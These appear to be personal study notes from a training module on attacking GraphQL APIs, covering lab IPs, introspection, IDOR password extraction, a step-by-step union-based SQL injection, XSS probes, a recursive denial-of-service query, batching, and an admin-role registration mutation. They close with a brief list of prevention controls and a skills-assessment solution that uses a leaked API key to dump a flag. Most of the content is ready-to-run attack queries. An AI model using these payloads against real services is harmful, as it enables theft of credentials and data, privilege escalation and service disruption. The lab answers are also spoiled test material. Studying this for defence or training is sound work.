# Attacking GraphQL

**Endpoints**  
/graphql  
/api/graphql

**Queries**

```graphql
{
  users {
    id
    username
    role
  }
}
```

```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```

```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}
```

```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

**Arguments**  
username: "admin"

**Fields**  
id  
username  
role  
password  
title  
author

**Objects**  
users  
posts  
User

**Tools / Services**  
GraphQL  
REST


# Information Disclosure 

**TOOLS**

graphw00f  
GraphQL-Voyager  
GraphiQL

**GRAPHQL ENDPOINT**

/graphql

**ENGINE FINGERPRINTING**

```
https://apis.guru/graphql-voyager/
```

```
git clone https://github.com/dolevf/graphw00f.git   
```

```
python3 main.py -d -f -t http://154.57.164.66:30450
```


**INTROSPECTION — LIST TYPES**

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```


**INTROSPECTION — TYPE FIELDS**

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**INTROSPECTION — LIST QUERIES**

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

**FULL INTROSPECTION QUERY**

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

**SCHEMA TYPES**

UserObject  
PostObject  
Query

**FIELDS**

uuid  
id  
username  
password  
role  
msg  
posts  
title  
body  
category  
authorId  
author

```
{ secrets { secret } }   
```
# Insecure Direct Object Reference (IDOR)

**GRAPHQL ENDPOINT**

/graphql

**USER PROFILE QUERY**

```graphql
{
  user(username: "htb-stdnt") {
    id
    username
    msg
    role
  }
}
```

**IDOR USER ENUMERATION**

```graphql
{
  user(username: "test") {
    id
    username
    msg
    role
  }
}
```

**INTROSPECTION — USER TYPE FIELDS**

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**IDOR PASSWORD EXTRACTION**

```graphql
{
  user(username: "test") {
    username
    password
  }
}
```

**FIELDS**

id  
username  
msg  
role  
password

**OBJECTS**

UserObject  
user

```
{
  user(username: "admin") {
    username
    password
  }
}
```

```
query { user(username: "admin") { id username password role } }   
```

# Injection Attacks 

**GRAPHQL ENDPOINT**

/graphql

**QUERIES WITH ARGUMENTS**

post  
user  
postByAuthor

**ARGUMENT DISCOVERY TEST**

```graphql
{
  postByAuthor {
    id
    title
  }
}
```

**VALID QUERY WITH ARGUMENT**

```graphql
{
  postByAuthor(author: "admin") {
    id
    title
  }
}
```

**SQLI TEST PAYLOAD**

```graphql
{
  postByAuthor(author: "admin --") {
    id
    title
  }
}
```

**SQLI TEST — USER QUERY**

```graphql
{
  user(username: "htb-stdnt --") {
    uuid
    username
    role
  }
}
```

**SQL ERROR TEST**

```graphql
{
  user(username: "htb-stdnt'") {
    uuid
    username
    role
  }
}
```

**UNION-BASED SQL INJECTION — TABLE ENUMERATION**

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

**XSS TEST — USER QUERY**

```graphql
{
  user(username: "<script>alert(1)</script>") {
    uuid
    username
    role
  }
}
```

**XSS TEST — INVALID ARGUMENT TYPE**

```graphql
{
  post(id: \"<script>alert(1)</script>") {
    id
    title
    body
    category
    author {
      username
    }
  }
}
```

**XSS TEST URL**

/post?id=alert(1)

**DATABASE ENUMERATION TARGET**

information_schema.tables  
table_name  
table_schema  
database()  
GROUP_CONCAT

**OBJECTS**

UserObject  
PostObject

**FIELDS**

uuid  
id  
username  
password  
role  
msg  
title  
body  
category  
authorId  
author

## Step 1 - Confirm SQL Injection

First test if the parameter is injectable.

Example:

```graphql
{
  user(username: "test'") {
    username
  }
}
```

If the backend SQL looks like:

```sql
SELECT * FROM users WHERE username = 'test'
```

Then adding `'` breaks the query and you get an **SQL error**, confirming injection.



## Step 2 - Find number of columns

`UNION SELECT` must match the **same number of columns**.

Test with increasing numbers:

```graphql
{
  user(username: "x' UNION SELECT NULL-- -") { username }
}
```

Then:

```graphql
{
  user(username: "x' UNION SELECT NULL,NULL-- -") { username }
}
```

to this 
```
{
  user(username: "x' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -") { username }
}
```

Continue until no error.

Example result:

```sql
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
```

Meaning:

 **6 columns**



## Step 3 - Find reflected column

Now determine **which column appears in the GraphQL response**.

Inject numbers:

```graphql
{
  user(username: "x' UNION SELECT 1,2,3,4,5,6-- -") {
    username
  }
}
```

Response:

```json
{
  "data": {
    "user": {
      "username": "3"
    }
  }
}
```

This tells us:

 Column **3 is reflected**

---

## Step 4 - Extract database name

Now replace column 3 with SQL functions.

Example:

```graphql
{
  user(username: "x' UNION SELECT 1,2,database(),4,5,6-- -") {
    username
  }
}
```

Example output:

```json
"username": "ctf_db"
```

---

## Step 5 - List tables

Use `information_schema.tables`.

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

Output:

```json
"username": "user,secret,flag,post"
```

---

## Step 6 - Find columns of a table

Suppose the **flag is likely in table `flag`**.

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```

Example result:

```
id,flag
```

---

## Step 7 - Dump the flag

Now query the actual data.

```graphql
{
  user(username: "x' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
    username
  }
}
```

Response:

```json
"username": "flag{graphql_sqli_master}"
```

---

## Visual summary

```
Find injection
      ↓
Find column count
      ↓
Find reflected column
      ↓
Get database()
      ↓
Get tables
      ↓
Get columns
      ↓
Dump data
```

---

## Pro  Tip

If output is truncated, use:

```sql
GROUP_CONCAT(column_name SEPARATOR ':')
```

or dump **row by row** with:

```sql
LIMIT 1 OFFSET 0
LIMIT 1 OFFSET 1
```

# Denial-of-Service (DoS) & Batching Attacks

**GRAPHQL ENDPOINT**

/graphql

**RECURSIVE QUERY (RESOURCE-INTENSIVE QUERY)**

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

**EXPONENTIAL RECURSIVE QUERY (DOS PAYLOAD)**

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**GRAPHQL BATCH REQUEST**

```
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
    {
        "query":"{user(username: \"admin\") {uuid}}"
    },
    {
        "query":"{post(id: 1) {title}}"
    }
]
```

**OBJECTS**

UserObject  
PostObject

**FIELDS**

uuid  
username  
posts  
author  
edges  
node  
id  
title


# Mutations

**GRAPHQL ENDPOINT**

/graphql

**INTROSPECTION — LIST MUTATIONS**

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**INTROSPECTION — MUTATION INPUT FIELDS**

```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

**PASSWORD HASHING**

```
echo -n 'password' | md5sum
```

**REGISTER USER MUTATION**

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

**PRIVILEGE ESCALATION MUTATION**

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

**ADMIN ENDPOINT**

/admin

**OBJECTS**

RegisterUserInput  
UserObject  
Mutation

**FIELDS**

username  
password  
role  
msg

**ROLES**

user  
admin


# Tools of the Trade 

**TOOLS**

GraphQL-Cop  
InQL  
Burp Suite  
GraphiQL

```
git clone https://github.com/APIs-guru/graphql-voyager
```

```
git clone https://github.com/dolevf/graphw00f
```

```
https://github.com/portswigger/inql
```
**GRAPHQL-COP VERSION CHECK**

```
git clone https://github.com/dolevf/graphql-cop
```

```
python3 graphql-cop.py -v
```

**GRAPHQL-COP SCAN**



```
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

**INQL BURP ACTION**

```
https://github.com/doyensec/inql
```
Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner

**INQL BURP ACTIONS**

Extensions > InQL - GraphQL Scanner > Batch attack  
Extensions > InQL - GraphQL Scanner > Open in GraphiQL

# GraphQL Vulnerability Prevention 

**GRAPHQL ENDPOINT**

/graphql

**SECURITY CONTROLS**

Disable Introspection  
Disable GraphQL IDE  
Disable Query Batching  
Limit Query Depth  
Limit Query Size  
Implement Rate Limiting  
Implement Input Validation  
Implement Output Encoding  
Implement Authentication  
Implement Authorization Checks  
Apply Principle of Least Privilege

**INPUT VALIDATION STRATEGY**

Allowlist Validation  
Sanitize User Input

**ERROR HANDLING**

Generic Error Messages  
Disable Verbose Errors

**GRAPHQL FEATURES TO RESTRICT**

Introspection Queries  
Batch Queries  
Alias Overloading  
Directive Overloading  
Field Duplication

**AUTHORIZATION TARGETS**

Queries  
Mutations

**SECURITY REFERENCE**

OWASP GraphQL Cheat Sheet

```
https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
```

# SA

## Discover available GraphQL queries
```
{  
__schema {  
queryType {  
fields {  
name  
}  
}  
}  
}
```

## Inspect query arguments
```
{  
__type(name: "Query") {  
fields {  
name  
args {  
name  
}  
}  
}  
}
```

## Retrieve API keys
```
{  
activeApiKeys {  
id  
key  
role  
}  
}
```

## Use the admin API key
```
{  
allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {  
id  
firstName  
lastName  
}  
}
```

## Identify SQL injection point
```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad"
    lastName: "htb'"
  ) {
    id
    firstName
    lastName
  }
}
```

![[Pasted image 20260315122202.png]]

```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad"
    lastName: "htb' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -"
  ) {
    id
    firstName
    lastName
  }
}
```
![[Pasted image 20260315122515.png]]

## Inject SQL payload
```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad"
    lastName: "htb' UNION SELECT 1,flag,3,4 FROM flag-- -"
  ) {
    id
    firstName
    lastName
  }
}
```
#